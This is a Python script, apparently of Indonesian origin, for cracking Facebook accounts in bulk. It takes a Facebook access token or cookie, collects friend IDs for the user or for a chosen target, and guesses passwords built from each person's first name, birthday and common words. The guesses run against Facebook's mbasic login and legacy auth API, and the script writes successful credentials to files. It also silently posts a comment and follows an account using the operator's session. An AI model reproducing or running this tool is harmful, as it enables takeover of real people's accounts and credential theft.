###############################
# Mau Recode? Sertain author yg buat :v #
# Author: Latip Harkat | github:Latip176 :v    #
###############################

#import modulenya :v
import requests as req,json,os,time,pyfiglet,re
from concurrent.futures import ThreadPoolExecutor as Bool
from bs4 import BeautifulSoup as parser
try:ua=req.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.strip()
except req.exceptions.ConnectionError:exit("[!] Connection Errno Goblok")
#nama - nama buat logo :v
try:
	log=pyfiglet.figlet_format('DRAGON')
	title=pyfiglet.figlet_format('DRAGON')
	teman=pyfiglet.figlet_format('FRIENDS')
	publik=pyfiglet.figlet_format('PUBLIC')
except:os.system('pip install pyfiglet')

os.system("clear")
#buat nampung data" :v
ok,cp,die=0,0,0
idTeman,idPublik=[],[]

#buat logika login dan login pake token :v
def pilihLogin():
	pil=input("[?] Select which one : ")
	if(pil in ("","  ","   ","    ","     ","      ","       ")):
		print("[!] Dont Be Empty\n")
		pilihLogin()
	elif(pil in ("1","01")):
		token=input("[!] Access Your Token Facebook : ")
		try:
			r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
			print("[√] Login Complete\nName Account :",r['name'])
			r2=req.post(f"https://graph.facebook.com/315723919935349/comments/?message=Hello abang tampan&access_token={token}")
			open('log.txt','a').write(token)
			time.sleep(2)
			nampung(token).menu()
		except KeyError:
			print('[!] Wrong Token')
			time.sleep(2)
			login()
	elif(pil in ("2","02")):
		cookie=input("[!] Input Your Cookie FB : ")
		tomken=req.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
		find_token = re.search('(EAAA\w+)',tomken.text)
		if (find_token is None):
			print("[!] Cookie Facebook Is Wrong")
			time.sleep(2)
			login()
		else:
			to=find_token.group(1)
			ru=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
			os.system("clear")
			print("[√] Login Complete\nName Account :",ru['name'])
			req.post(f"https://graph.facebook.com/315723919935349/comments/?message=Hello abang tampan&access_token={to}")
			time.sleep(2)
			open("log.txt","a").write(to)
			nampung(to).menu()
			try:
				cek=req.get("https://mbasic.facebook.com/100063522272055",cookies={"cookie":cookie}).text
				true=False
				if "Berhenti mengikuti" not in cek:true=True
				if true==True:
					req.get("https://mbasic.facebook.com/"+parser(cek,"html.parser").find("a",string="Ikuti").get("href"),cookies={"cookie":cookie})
				else:pass
			except:pass
			nampung(to).menu()
	else:
		print("[!] Option does not exist\n")
		pilihLogin()
def login():
	os.system('clear')
	print(log+"\nPlease Login First :>\n[1]. Login With Access Token FB\n[2]. Login With Cookie Facebook\n")
	pilihLogin()
def logika():
	try:
		token=open('log.txt','r').read()
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
		print('[√] You Have Already Logged in\nYour Account Name :',r['name'])
		time.sleep(2)
		nampung(token).menu()
	except KeyError:
		print('[!] Token invalid')
		os.system("rm -rf tt.txt")
		time.sleep(2)
		login()
	except FileNotFoundError:
		print('[!] Please Login First Uncle ')
		time.sleep(2)
		login()
#class buat ngecrack :v
class crack:
	
	def __init__(self,token):self.token=token
	#methode mbasic :v
	def mbasic(self,user,pw,ttl):
		global ok,cp,die
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for c in a("input"):
			try:
				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
				else:continue
			except:pass
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in d.cookies:
			ok+=1
			open("ok.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;32m[OK] {user} | {pw} | {ttl}         \x1b[0m",end="")
			print("")
		elif "checkpoint" in d.cookies:
			cp+=1
			open("cp.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}      \x1b[0m",end="")
			print("")
		else:die+=1
		print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
	def mbasic2(self,user,pw,ttl):
		global ok,cp,die
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for c in a("input"):
			try:
				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
				else:continue
			except:pass
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in d.cookies:
			ok+=1
			open("ok.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;32m[OK] {user} | {pw} | {ttl}         \x1b[0m",end="")
			print("")
		elif "checkpoint" in d.cookies:
			cp+=1
			open("cp.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}      \x1b[0m",end="")
			print("")
		else:die+=1
		print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
	#methode api :v
	def api1(self,user,pw,tll):
		global ok,cp,die
		r=json.loads(req.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").text)
		if 'access_token' in r:
			ok+=1
			open('ok.txt','a').write(user+' | '+pw+' | '+ttl)
			print(f'\r\x1b[1;32m[OK] {user} | {pw} {ttl}',end='')
			print('')
		elif 'www.facebook.com' in r['error_msg']:
			cp+=1
			open('cp.txt','a').write(user+' | '+pw+' | '+ttl)
			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}",end="")
			print("")
		else:die+=1
		print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
	def api2(self,user,pw,tll):
		global ok,cp,die
		r=json.loads(req.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").text)
		if 'access_token' in r:
			ok+=1
			open('ok.txt','a').write(user+' | '+pw+' | '+ttl)
			print(f'\r\x1b[1;32m[OK] {user} | {pw} {ttl}',end='')
			print('')
		elif 'www.facebook.com' in r['error_msg']:
			cp+=1
			open('cp.txt','a').write(user+' | '+pw+' | '+ttl)
			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}",end="")
			print("")
		else:die+=1
		print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
#class buat nampung id + send ke class crack :v
class nampung:
	
	def __init__(self,token):self.token=token
	#id teman + send teman :v
	def sendTeman(self):
		global idTeman
		os.system('clear')
		print(teman+"\nSubscribe Youtube Ramdhan Ramadhian ID | Stop? CTRL + Z\n")
		print('[!] Select Methode Crack\n[1]. Methode Mbasic (Medium, some results will successful)\n[2]. Methode Api (Fast, all hit by checkpoints)\n')
		pi=input("[?] Mau methode mana : ")
		time.sleep(1)
		print("\n[!] Ok save : ok.txt\n[!] Cp save : cp.txt\n")
		with Bool(max_workers=35) as tokai:
			r=json.loads(req.get(f"https://graph.facebook.com/me/friends?access_token={self.token}").text)
			for i in r['data']:idTeman.append(i['id'])
			print("[√] Jumlah ID :",len(idTeman))
			time.sleep(1)
			print("[+] Starting crack...\n==========================\n")
		if(pi in ("1","01")):
			with Bool(max_workers=35) as tokai:
				for j in idTeman:
					r2=json.loads(req.get(f"https://graph.facebook.com/{j}?access_token={self.token}").text)
					try:pwList=[r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345',r2['first_name']+'123456',r2['first_name']+'1234567','Sayang','Sayang123','Bangsad','Bangsad123','Monyet','Monyet123','Indonesia','Anjing','Anjing123','Freefire','Freefire123','Kontol','Kontol123','Motor123',r2['birthday']]
					except:pass
					try:
						for pw in pwList:tokai.submit(crack(self.token).mbasic,j,pw,pwList[-1])
					except:pass
		elif(pi in ("2","02")):
			with Bool(max_workers=35) as tokai:
				for j in idTeman:
					r2=json.loads(req.get(f"https://graph.facebook.com/{j}?access_token={self.token}").text)
					try:pwList=[r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345',r2['first_name']+'123456',r2['first_name']+'1234567','Sayang','Sayang123','Bangsad','Bangsad123','Monyet','Monyet123','Indonesia','Anjing','Anjing123','Freefire','Freefire123','Kontol','Kontol123','Motor123',r2['birthday']]
					except:pass
					try:
						for pw in pwList:tokai.submit(crack(self.token).api1,j,pw,pwList[-1])
					except:pass
	#id publik + send publik :v
	def sendPublik(self):
		global idPublik
		os.system('clear')
		print(publik+"\nSubscribe Youtube Ramdhan Ramadhian ID | Stop? CTRL + Z\n")
		print('\n[!] Select Methode Crack\n[1]. Methode Mbasic (Medium, some results will successful)\n[2]. Methode Api (Fast, all hit by checkpoints)\n')
		pi=input("[?] Mau methode mana : ")
		print("")
		target=input("[?] ID FB target/public : ")
		try:
			t=json.loads(req.get(f"https://graph.facebook.com/{target}?access_token={self.token}").text)
			print("\n[+] Name target/public :",t['name'])
		except:
			print('[×] Target/Public not found')
			time.sleep(2)
			nampung(self.token).menu()
		with Bool(max_workers=35) as tokai:
			r=json.loads(req.get(f"https://graph.facebook.com/{target}/friends?access_token={self.token}").text)
			for i in r['data']:idPublik.append(i['id'])
			print("[+] Jumlah ID :",len(idPublik))
			time.sleep(1)
			print("\n[!] Ok save : ok.txt\n[!] Cp save : cp.txt\n==========================\n")
		if(pi in ("1","01")):
			with Bool(max_workers=35) as tokai:
				for j in idPublik:
					r2=json.loads(req.get(f"https://graph.facebook.com/{j}?access_token={self.token}").text)
					try:pwList=[r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345',r2['first_name']+'123456',r2['first_name']+'1234567','Sayang','Sayang123','Bangsad','Bangsad123','Monyet','Monyet123','Indonesia','Anjing','Anjing123','Freefire','Freefire123','Kontol','Kontol123','Motor123',r2['birthday']]
					except:pass
					try:
						for pw in pwList:tokai.submit(crack(self.token).mbasic2,j,pw,pwList[-1])
					except:pass
		elif(pi in ("2","02")):
			with Bool(max_workers=35) as tokai:
				for j in idPublik:
					r2=json.loads(req.get(f"https://graph.facebook.com/{j}?access_token={self.token}").text)
					try:pwList=[r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345',r2['first_name']+'123456',r2['first_name']+'1234567','Sayang','Sayang123','Bangsad','Bangsad123','Monyet','Monyet123','Indonesia','Anjing','Anjing123','Freefire','Freefire123','Kontol','Kontol123','Motor123',r2['birthday']]
					except:pass
					try:
						for pw in pwList:tokai.submit(crack(self.token).api2,j,pw,pwList[-1])
					except:pass
	#menu buat nentuin mau crack apa + methode apa :v
	def pilihan(self):
		pilih=input("[?] Pilih yang mana : ")
		if pilih in ("01","1"):nampung(self.token).sendTeman()
		elif pilih in ("02","2"):nampung(self.token).sendPublik()
		elif pilih=="99":
			os.system("rm -rf log.txt")
			exit("[√] Logout Succes")
		else:
			print("[!] Option does not exist \n")
			nampung(self.token).pilihan()
	def menu(self):
		os.system("clear")
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={self.token}").text)
		print(title+"\nUID :",r['id'],"\nNAME :",r['name'],"\nDATE-ACCOUNT :",r['birthday'],"\n=============================\n[1]. Crack ID FriendsList\n[2]. Crack ID Friends/Public\n[99]. Delete Cookies\n")
		nampung(self.token).pilihan()
		
#running :v		
if __name__=="__main__":
	logika()
